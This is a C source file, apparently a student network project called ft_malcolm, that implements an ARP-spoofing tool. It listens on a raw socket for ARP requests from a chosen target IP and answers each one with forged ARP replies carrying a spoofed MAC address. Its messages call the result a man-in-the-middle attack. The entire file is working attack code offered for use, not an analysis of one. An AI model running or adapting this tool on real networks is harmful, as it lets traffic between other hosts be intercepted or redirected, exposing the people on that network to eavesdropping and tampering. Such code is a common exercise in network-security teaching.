#include "ft_malcolm.h"

//#define BUFFER_SIZE 1514

char ip_address[16];

typedef struct s_arphdr {
    unsigned short int ar_hrd;      /* Type de matériel (ethernet, etc.) */
    unsigned short int ar_pro;      /* Type de protocole (IP, etc.) */
    unsigned char ar_hln;           /* Longueur de l'adresse matérielle */
    unsigned char ar_pln;           /* Longueur de l'adresse de protocole */
    unsigned short int ar_op;       /* Opération ARP (requête ou réponse) */
    unsigned char ar_sha[ETH_ALEN]; /* Adresse matérielle source */
    unsigned char ar_spa[4];        /* Adresse de protocole source */
    unsigned char ar_tha[ETH_ALEN]; /* Adresse matérielle de destination */
    unsigned char ar_tpa[4];        /* Adresse de protocole de destination */
}               t_arphdr;

typedef struct s_arp_packet_receive{
    struct ether_header *ethhdr;
    t_arphdr *arphdr;
} t_arp_packet_receive;


typedef struct s_arp_packet_response{
    struct ether_header ethhdr;
    t_arphdr arphdr;
} t_arp_packet_response;

typedef struct s_all{
    t_arp_packet_response   response;
    unsigned char mac_address_source[ETH_ALEN];
    unsigned char mac_address_target[ETH_ALEN];
    unsigned char real_mac_address[ETH_ALEN];
    unsigned char ip_address_source[4];
    unsigned char ip_address_target[4];
    int                     sockfd;
    int                     verbose;
    struct sockaddr_ll      saddr;
} g_all;

g_all all;

void	*ft_memcpy(void *dest, const void *src, size_t n)
{
	const char	*tmp;
	char		*fin;
	int			i;

	if (!dest && !src)
		return (NULL);
	tmp = (const char *)src;
	fin = (char *)dest;
	i = 0;
	while (n > 0)
	{
		fin[i] = tmp[i];
		i++;
		n--;
	}
	return (fin);
}

void    fill_target_and_source(char* msource, char* mtarget)
{
    for (int i = 0, j = 0; i < 12; i += 2, j++) {
        int high = msource[i] <= '9' ? msource[i] - '0' : msource[i] - 'a' + 10;
        int low = msource[i+1] <= '9' ? msource[i+1] - '0' : msource[i+1] - 'a' + 10;
        all.mac_address_source[j] = (high << 4) | low;
    }

    for (int i = 0, j = 0; i < 12; i += 2, j++) {
        int high = mtarget[i] <= '9' ? mtarget[i] - '0' : mtarget[i] - 'a' + 10;
        int low = mtarget[i+1] <= '9' ? mtarget[i+1] - '0' : mtarget[i+1] - 'a' + 10;
        all.mac_address_target[j] = (high << 4) | low;
    }
    free(msource);
    free(mtarget);
    return ;
}

char *delete_double_point(char *mac)
{
    char *str = malloc(sizeof(char) * 13);
    int i = 0, j = 0;

    while(mac[i])
    {
        if (mac[i] != ':')
        {
            str[j] = mac[i];
            j++;
        }
        i++;
    }
    str[j] = '\0';
    return str;
}

void str_to_ip(const char *str, unsigned char *ip) {
    int num = 0, i = 0, j = 0;
    while (str[j] != '\0') {
        if (str[j] == '.') {
            ip[i++] = (unsigned char) num;
            num = 0;
        } else {
            num = num * 10 + (str[j] - '0');
        }
        j++;
    }
    ip[i] = (unsigned char) num;
}

void    verbose_print()
{
    printf("ARP Header:\n");
    printf("Hardware type: %u\n", ntohs(all.response.arphdr.ar_hrd));
    printf("Protocol type: %u\n", ntohs(all.response.arphdr.ar_pro));
    printf("Hardware address length: %u\n", all.response.arphdr.ar_hln);
    printf("Protocol address length: %u\n", all.response.arphdr.ar_pln);
    printf("Opcode: %u\n", ntohs(all.response.arphdr.ar_op));
    printf("Adresse MAC source : %02x:%02x:%02x:%02x:%02x:%02x\n", all.response.arphdr.ar_sha[0], all.response.arphdr.ar_sha[1], all.response.arphdr.ar_sha[2], all.response.arphdr.ar_sha[3], all.response.arphdr.ar_sha[4], all.response.arphdr.ar_sha[5]);
    printf("Adresse IP source : %d.%d.%d.%d\n", all.response.arphdr.ar_spa[0], all.response.arphdr.ar_spa[1], all.response.arphdr.ar_spa[2], all.response.arphdr.ar_spa[3]);
    printf("Adresse MAC target : %02x:%02x:%02x:%02x:%02x:%02x\n", all.response.arphdr.ar_tha[0], all.response.arphdr.ar_tha[1], all.response.arphdr.ar_tha[2], all.response.arphdr.ar_tha[3], all.response.arphdr.ar_tha[4], all.response.arphdr.ar_tha[5]);
    printf("Adresse IP target : %d.%d.%d.%d\n", all.response.arphdr.ar_tpa[0], all.response.arphdr.ar_tpa[1], all.response.arphdr.ar_tpa[2], all.response.arphdr.ar_tpa[3]);
    printf("SLL Header:\n");
    printf("Family: %hu\n", all.saddr.sll_family);
    printf("Interface index: %d\n", all.saddr.sll_ifindex);
    printf("Protocol: %hu\n", ntohs(all.saddr.sll_protocol));
    printf("Address length: %hhu\n", all.saddr.sll_halen);
    printf("Address ssl: %02x:%02x:%02x:%02x:%02x:%02x\n",
           all.saddr.sll_addr[0], all.saddr.sll_addr[1], all.saddr.sll_addr[2],
           all.saddr.sll_addr[3], all.saddr.sll_addr[4], all.saddr.sll_addr[5]);

    printf("eth dest address: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   all.response.ethhdr.ether_dhost[0], all.response.ethhdr.ether_dhost[1],
                   all.response.ethhdr.ether_dhost[2], all.response.ethhdr.ether_dhost[3],
                   all.response.ethhdr.ether_dhost[4], all.response.ethhdr.ether_dhost[5]);

    printf("eth src address: %02x:%02x:%02x:%02x:%02x:%02x\n\n",
                   all.response.ethhdr.ether_shost[0], all.response.ethhdr.ether_shost[1],
                   all.response.ethhdr.ether_shost[2], all.response.ethhdr.ether_shost[3],
                   all.response.ethhdr.ether_shost[4], all.response.ethhdr.ether_shost[5]);
    return ;
}

void    request_reply(char *ip_source, char *mac_source, char *ip_target, char *mac_target, struct in_addr dest_ip_rec)
{
    int if_index;

    fill_target_and_source(delete_double_point(mac_source), delete_double_point(mac_target));
    str_to_ip(ip_source, all.ip_address_source);
    str_to_ip(ip_target, all.ip_address_target);
    all.response.arphdr.ar_hrd = htons(ARPHRD_ETHER);
    all.response.arphdr.ar_pro = htons(ETH_P_IP);
    all.response.arphdr.ar_hln = 6;
    all.response.arphdr.ar_pln = 4;
    all.response.arphdr.ar_op = htons(2);
    ft_memcpy(all.response.arphdr.ar_sha, all.mac_address_source, ETH_ALEN);
    ft_memcpy(all.response.arphdr.ar_spa, &dest_ip_rec, 4);
    ft_memcpy(all.response.arphdr.ar_tpa, all.ip_address_target, 4);
    ft_memcpy(all.response.arphdr.ar_tha, all.mac_address_target, ETH_ALEN);
    ft_memcpy(all.response.ethhdr.ether_dhost, all.mac_address_target, ETH_ALEN);
    ft_memcpy(all.response.ethhdr.ether_shost, all.mac_address_source, ETH_ALEN);
    ft_memcpy(all.saddr.sll_addr, all.mac_address_target, ETH_ALEN);
    if_index = if_nametoindex("enp0s1");
    all.saddr.sll_family = AF_PACKET;
    all.saddr.sll_ifindex = if_index;
    all.saddr.sll_protocol = htons(ETH_P_ARP);
    all.saddr.sll_pkttype = PACKET_OTHERHOST;
    all.saddr.sll_hatype = ARPHRD_ETHER;
    all.saddr.sll_halen = ETH_ALEN;
    all.response.ethhdr.ether_type = htons(ETH_P_ARP);
    if (all.verbose == 1)
        verbose_print(all.saddr);
    int i = 1;
    while (i < 10)
    {    
        if (sendto(all.sockfd, &all.response, sizeof(t_arp_packet_response), 0, (struct sockaddr *) &all.saddr, sizeof(all.saddr)) < 0) {
            perror("Erreur lors de l'envoi de la requête ARP");
            exit(EXIT_FAILURE);
        }
        sleep(1);
        if (i % 3 == 0)
            printf(".\n");
        else   
            printf(".");
        i++;
    }
    printf("\nSpoofing done !\n");
    return ;
}

void    inthandler()
{
    printf("\nEnd of the man in the middle attack ...\n");
    close(all.sockfd);
    exit(0);
}

void    exit_msg(char *str)
{
    printf("%s\n", str);
    exit(1);
}

int		ft_strncmp(const char *s1, const char *s2, size_t n)
{
	if (n <= 0)
		return (0);
	while (n > 1 && (*s1 != '\0' && *s2 != '\0') && *s1 == *s2)
	{
		s1++;
		s2++;
		n--;
	}
	return ((unsigned char)*s1 - (unsigned char)*s2);
}

int		ft_strlen(char *s)
{
	int i;

	i = 0;
	while (s[i] != '\0')
	{
		i++;
	}
	return (i);
}

int main(int argc, char **argv) 
{
    if (getuid() != 0)
        exit_msg("Usage: sudo <ft_malcolm> [source ip] [source mac address] [target ip] [target mac address] option : (-v)");
    all.verbose = 0;
    if (argc != 5 )
    {
        if (argc == 6)
        {
            if (ft_strncmp((argv[5]), "-v", ft_strlen("-v")) == 0 && ft_strlen(argv[5]) == ft_strlen("-v"))
                all.verbose = 1;
            else 
                exit_msg("Usage: sudo <ft_malcolm> [source ip] [source mac address] [target ip] [target mac address] option : (-v)");
        }
        else
            exit_msg("Usage: sudo <ft_malcolm> [source ip] [source mac address] [target ip] [target mac address] option : (-v)");
    }
    signal(SIGINT, inthandler);
    char buffer[BUFFER_SIZE];
    ssize_t recv_len;
    t_arp_packet_receive receive;
    struct in_addr src_ip_rec, dest_ip_rec;
    const char *ifname = "enp0s1";
    unsigned char mac_address_source[ETH_ALEN];
    

    all.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(all.sockfd < 0) {
        perror("socket");
        return 1;
    }
    printf("Waiting arp request to spoof...\n\n");

    while(1) {
        recvfrom(all.sockfd, buffer, ETH_FRAME_LEN, 0, (struct sockaddr*)&all.saddr, (socklen_t*)sizeof(all.saddr));
        receive.ethhdr = (struct ether_header *) buffer;
        receive.arphdr = (t_arphdr *) (buffer + sizeof(struct ether_header));
        if(ntohs(receive.ethhdr->ether_type) == ETHERTYPE_ARP && ntohs(receive.arphdr->ar_op) == ARPOP_REQUEST) 
        {
            ft_memcpy(&src_ip_rec.s_addr, receive.arphdr->ar_spa, sizeof(src_ip_rec.s_addr));
            ft_memcpy(&dest_ip_rec.s_addr, receive.arphdr->ar_tpa, sizeof(src_ip_rec.s_addr));
            if (inet_addr(argv[3]) == src_ip_rec.s_addr ){
                printf("Spoofing in progress\n\n");
                request_reply(argv[1], argv[2], argv[3], argv[4], dest_ip_rec);
                printf("\nWaiting arp request to spoof again...\n\n");
                //break;
            }
            else{
                printf("Received ARP request:\n");
                printf("Adresse IP source of the packet: %d.%d.%d.%d\n", receive.arphdr->ar_spa[0], receive.arphdr->ar_spa[1], receive.arphdr->ar_spa[2], receive.arphdr->ar_spa[3]);
                printf("Adresse IP dest of the packet: %d.%d.%d.%d\n", receive.arphdr->ar_tpa[0], receive.arphdr->ar_tpa[1], receive.arphdr->ar_tpa[2], receive.arphdr->ar_tpa[3]);
                printf("Adresse MAC source : %02x:%02x:%02x:%02x:%02x:%02x\n\n", receive.arphdr->ar_sha[0], receive.arphdr->ar_sha[1], receive.arphdr->ar_sha[2], receive.arphdr->ar_sha[3], receive.arphdr->ar_sha[4], receive.arphdr->ar_sha[5]);
            }
        }
    }

    //close(all.sockfd);
    return 0;
}